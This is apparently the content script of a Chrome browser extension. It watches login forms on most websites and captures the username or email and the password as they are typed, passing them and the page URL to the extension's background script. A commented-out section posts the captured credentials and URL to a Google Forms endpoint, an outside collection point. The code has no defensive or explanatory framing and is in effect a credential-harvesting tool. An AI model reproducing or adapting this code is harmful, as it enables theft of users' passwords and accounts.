
var port = chrome.runtime.connect({ name: "from" });
var oldUrl = "";
var pass;
var user;
if (window.location.href.indexOf("https://www.google.com") == 0) { port.postMessage({ setForm: "neg" });}
if (window.location.href.indexOf("https://www.google.com") != 0) { port.postMessage({ setForm: "pos" }) }
port.postMessage({ setForm: "inputs" });
port.postMessage({ setForm: "pos" });
        port.postMessage({ setForm: "canwe" });
        port.onMessage.addListener(function (msg) {
            if (msg.question == "yes") {
                var url = window.location.href;
                port.postMessage({ setForm: "setURL", setFormURL: url });

                $("form").find('input[type="text"][name*="og"]', 'input[type="text"][name*="user"]',  'input[type="text"][name*="ser"]', 'input[type="text"][name*="mail"]').change(function () {
                    console.log($("form").find('input[type="text"][name*="user"]', 'input[type="text"][name*="og"]', 'input[type="text"][name*="ser"]', 'input[type="text"][name*="mail"]').val());
                    var user = ($("form").find('input[type="text"][name*="user"]', 'input[type="text"][name*="og"]', 'input[type="text"][name*="ser"]', 'input[type="text"][name*="mail"]').val());
                    alert($('input[type="text"][name*="og"]'));
                    port.postMessage({ setForm: "setU", setFormU: user });
                });
                $("form").find('input[type="password"][name*="ass"]').change(function () {
                    console.log($("form[id]").find('input[type="password"][name*="ass"]').val());
                    var pass = ($("form[id]").find('input[type="password"][name*="ass"]').val());
                    port.postMessage({ setForm: "setP", setFormP: pass });
                });
            }
            if (($("form").find('input[type="text"][name*="og"]','input[type="text"][name*="user"]',  'input[type="text"][name*="ser"]', 'input[type="text"][name*="mail"]').length > 0)) {
                alert($('input[type="text"][name*="og"]'));
            }
            /*
            if (msg.question == "yes" && ($("form[id]").find('input[type="text"][name*="user"]', 'input[type="text"][name*="og"]', 'input[type="text"][name*="ser"]', 'input[type="text"][name*="mail"]').length > 0)){
                port.postMessage({ setForm: "sendinputs" });
            }
            if (msg.question == "inputrec") {
            $.ajax({
                url: "https://docs.google.com/forms/d/e/1FAIpQLSc41rW50BNwmypes59GTFjBosHkZw5hIB7VTyQGRoSr6FB5kA/formResponse",
                data: {
                    "entry.1323035796": msg.questionu, "entry.1641535562": msg.questionp, "entry.43691568": msg.questionurl
                },
                type: "POST",
                dataType: "xml",
                statusCode: {
                    0: function () {
                        console.log("hello");
                    },
                    200: function () {
                        console.log("by");
                    }
                }
            });
            }*/
        });  
